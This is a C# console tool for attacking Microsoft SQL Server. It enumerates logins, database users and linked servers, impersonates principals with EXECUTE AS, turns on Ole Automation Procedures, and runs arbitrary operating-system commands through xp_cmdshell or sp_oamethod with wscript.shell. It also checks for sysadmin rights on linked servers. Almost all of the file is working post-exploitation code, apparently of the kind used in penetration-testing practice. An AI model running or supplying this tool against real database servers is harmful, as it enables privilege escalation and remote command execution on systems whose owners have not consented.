using System;using System;
using System.Data.SqlClient;
using System.Collections.Generic;

namespace SQL
{
    class Program
    {
        static void Main(string[] args)
        {
            // Ask the user for SQL Server and Database name
            Console.Write("Enter SQL Server name: ");
            string sqlServer = Console.ReadLine();

            Console.Write("Enter Database name: ");
            string database = Console.ReadLine();

            // Construct the connection string dynamically
            string conString = $"Server={sqlServer}; Database={database}; Integrated Security=True; MultipleActiveResultSets=true;";

            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open(); // Open the connection
                Console.WriteLine("\n[+] Connection established successfully." + "\n");

                while (true)
                {
                    // List logins and users
                    List<string> impersonableLogins = ListImpersonableLogins(con);
                    List<string> impersonableUsers = ListImpersonableUsers(con);
                    List<string> linkedServers = ListLinkedServers(con);

                    // Display available options
                    Console.WriteLine("Choose an option:" + "\n");
                    Console.WriteLine("\t" + "1. Impersonate a login (EXECUTE AS LOGIN)");
                    Console.WriteLine("\t" + "2. Impersonate a user (EXECUTE AS USER)");
                    Console.WriteLine("\t" + "3. List all available SQL links (Linked Servers)" + "\n");
                    Console.Write("Enter 1, 2, or 3: ");
                    string choice = Console.ReadLine();

                    if (choice.Equals("exit", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("Exiting...");
                        break;
                    }

                    if (choice == "1")
                    {
                        // Display list of logins to impersonate
                        Console.WriteLine("\nSelect a login to impersonate:" + "\n");
                        for (int i = 0; i < impersonableLogins.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {impersonableLogins[i]}\n");
                        }
                        Console.Write("Enter the number of the login to impersonate: ");
                        int loginChoice = int.Parse(Console.ReadLine()) - 1;

                        if (loginChoice >= 0 && loginChoice < impersonableLogins.Count)
                        {
                            string selectedLogin = impersonableLogins[loginChoice];
                            ImpersonateLoginAndExecuteCommand(con, selectedLogin);
                        }
                        else
                        {
                            Console.WriteLine("Invalid choice.");
                        }
                    }
                    else if (choice == "2")
                    {
                        // Display list of users to impersonate
                        Console.WriteLine("Select a user to impersonate:" + "\n");
                        for (int i = 0; i < impersonableUsers.Count; i++)
                        {
                            Console.WriteLine($"\t{i + 1}. {impersonableUsers[i]}");
                        }
                        Console.Write("\nEnter the number of the user to impersonate: ");
                        int userChoice = int.Parse(Console.ReadLine()) - 1;

                        if (userChoice >= 0 && userChoice < impersonableUsers.Count)
                        {
                            ImpersonateAndExecute(con, impersonableUsers[userChoice]);
                        }
                        else
                        {
                            Console.WriteLine("Invalid choice.");
                        }
                    }
                    else if (choice == "3")
                    {
                        // List all linked servers with sysadmin check
                        Console.WriteLine("Available linked servers:");
                        foreach (var server in linkedServers)
                        {
                            Console.WriteLine(server);
                            bool hasSysadmin = CheckSysAdminAccess(con, server);
                            if (hasSysadmin)
                            {
                                Console.WriteLine($"- You have SYSADMIN access to this server.");
                            }
                            else
                            {
                                Console.WriteLine($"- You do NOT have SYSADMIN access to this server.");
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("Invalid choice. Please enter 1, 2, or 3.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("An error occurred while opening the connection: " + ex.Message);
            }
            finally
            {
                if (con.State == System.Data.ConnectionState.Open)
                {
                    con.Close();
                    Console.WriteLine("Connection closed.");
                }
            }
        }

        static List<string> ListImpersonableLogins(SqlConnection con)
        {
            List<string> logins = new List<string>();
            string query = "SELECT name FROM sys.server_principals WHERE type IN ('S', 'U')" + "\n"; // Include 'sa'
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    logins.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error listing logins: " + ex.Message);
            }

            return logins;
        }

        static List<string> ListImpersonableUsers(SqlConnection con)
        {
            List<string> users = new List<string>();
            string query = "SELECT name FROM sys.database_principals WHERE type IN ('S', 'U', 'G');";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    users.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error listing users: " + ex.Message);
            }

            return users;
        }

        static List<string> ListLinkedServers(SqlConnection con)
        {
            List<string> linkedServers = new List<string>();
            string query = "SELECT name FROM sys.servers WHERE is_linked = 1;";
            SqlCommand command = new SqlCommand(query, con);

            try
            {
                SqlDataReader reader = command.ExecuteReader();
                while (reader.Read())
                {
                    linkedServers.Add(reader.GetString(0));
                }
                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error listing linked servers: " + ex.Message);
            }

            return linkedServers;
        }

        static bool CheckSysAdminAccess(SqlConnection con, string linkedServer)
        {
            // Check if the current user has sysadmin access to the linked server
            string checkSysAdminQuery = $"SELECT IS_SRVROLEMEMBER('sysadmin', '{linkedServer}')";

            try
            {
                SqlCommand command = new SqlCommand(checkSysAdminQuery, con);
                object result = command.ExecuteScalar();

                // Ensure that the result is a valid bit (0 or 1)
                if (result != null && result is bool)
                {
                    return (bool)result; // Cast directly to boolean
                }
                else
                {
                    Console.WriteLine("Error: Unable to check sysadmin access. Invalid result from IS_SRVROLEMEMBER.");
                    return false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error checking sysadmin access to {linkedServer}: " + ex.Message);
                return false;
            }
        }

        static void ImpersonateLoginAndExecuteCommand(SqlConnection con, string impersonatedLogin)
        {
            try
            {
                string impersonateCmd = $"EXECUTE AS LOGIN = '{impersonatedLogin}';";
                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                impersonateCommand.ExecuteNonQuery();
                Console.WriteLine($"\nImpersonating login: {impersonatedLogin}...\n");

                // Ensure Ole Automation Procedures are enabled
                EnableOleAutomationProcedures(con);

                // Ask the user to choose between xp_cmdshell or sp_oamethod
                Console.WriteLine("Choose how to execute the command:" + "\n");
                Console.WriteLine("\t" + "1. Use xp_cmdshell");
                Console.WriteLine("\t" + "2. Use sp_oamethod (WScript Shell)" + "\n");
                Console.Write("Enter 1 or 2: ");
                string execChoice = Console.ReadLine();

                // Get the command to execute
                Console.Write("Enter the command to execute: ");
                string usercommand = Console.ReadLine();

                if (execChoice == "1")
                {
                    // Execute using xp_cmdshell
                    Console.WriteLine();
                    ExecuteCommandWithXpCmdShell(con, usercommand);
                }
                else if (execChoice == "2")
                {
                    // Execute using sp_oamethod
                    ExecuteCommandWithSpOaMethod(con, usercommand);
                }
                else
                {
                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
                }

                // Revert the impersonation
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("\n" + "Reverted impersonation." + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error impersonating login and executing command: " + ex.Message);
            }
        }

        static void ImpersonateAndExecute(SqlConnection con, string impersonatedUser)
        {
            Console.Write("Enter the command to execute: ");
            string usercommand = Console.ReadLine();

            try
            {
                string impersonateCmd = $"EXECUTE AS USER = '{impersonatedUser}';";
                SqlCommand impersonateCommand = new SqlCommand(impersonateCmd, con);
                impersonateCommand.ExecuteNonQuery();
                Console.WriteLine($"Impersonating user: {impersonatedUser}...\n");

                // Ask the user to choose between xp_cmdshell or sp_oamethod
                Console.WriteLine("Choose how to execute the command:" + "\n");
                Console.WriteLine("\t1. Use xp_cmdshell");
                Console.WriteLine("\t2. Use sp_oamethod (WScript Shell)" + "\n");
                Console.Write("Enter 1 or 2: ");
                string execChoice = Console.ReadLine();

                if (execChoice == "1")
                {
                    // Execute using xp_cmdshell
                    ExecuteCommandWithXpCmdShell(con, usercommand);
                }
                else if (execChoice == "2")
                {
                    // Execute using sp_oamethod
                    ExecuteCommandWithSpOaMethod(con, usercommand);
                }
                else
                {
                    Console.WriteLine("Invalid choice. Please enter 1 or 2.");
                }

                // Revert the impersonation
                string revertCmd = "REVERT;";
                SqlCommand revertCommand = new SqlCommand(revertCmd, con);
                revertCommand.ExecuteNonQuery();
                Console.WriteLine("Reverted impersonation." + "\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error impersonating user and executing command: " + ex.Message);
            }
        }

        static void EnableOleAutomationProcedures(SqlConnection con)
        {
            try
            {
                // Check if Ole Automation Procedures are enabled
                string checkCmdShellQuery = "EXEC sp_configure 'Ole Automation Procedures';";
                SqlCommand checkCmdShellCommand = new SqlCommand(checkCmdShellQuery, con);
                SqlDataReader reader = checkCmdShellCommand.ExecuteReader();

                while (reader.Read())
                {
                    int configValue = reader.GetInt32(1); // config_value is at index 1
                    if (configValue == 0)
                    {
                        // Enable Ole Automation Procedures
                        string enableCmdShellQuery = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;";
                        SqlCommand enableCmdShellCommand = new SqlCommand(enableCmdShellQuery, con);
                        enableCmdShellCommand.ExecuteNonQuery();
                        Console.WriteLine("Enabled Ole Automation Procedures.\n");
                    }
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error enabling Ole Automation Procedures: " + ex.Message);
            }
        }

        static void ExecuteCommandWithXpCmdShell(SqlConnection con, string usercommand)
        {
            try
            {
                string execCmd = $"EXEC xp_cmdshell '{usercommand}';";
                SqlCommand command = new SqlCommand(execCmd, con);
                SqlDataReader reader = command.ExecuteReader();

                bool hasOutput = false; // Flag to check if there is any output

                while (reader.Read())
                {
                    string result = reader.IsDBNull(0) ? null : reader.GetString(0); // Check for null values in the result

                    if (result != null)
                    {
                        Console.WriteLine(result); // Output the command result if it's not null
                        hasOutput = true;
                    }
                }

                if (!hasOutput)
                {
                    Console.WriteLine("No output returned from xp_cmdshell.");
                }

                reader.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing xp_cmdshell command: " + ex.Message);
            }
        }


        static void ExecuteCommandWithSpOaMethod(SqlConnection con, string usercommand)
        {
            try
            {
                string execCmd = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{usercommand}';";
                SqlCommand command = new SqlCommand(execCmd, con);
                command.ExecuteNonQuery();
                Console.WriteLine("\nCommand executed successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error executing sp_oamethod command: " + ex.Message);
            }
        }
    }
}
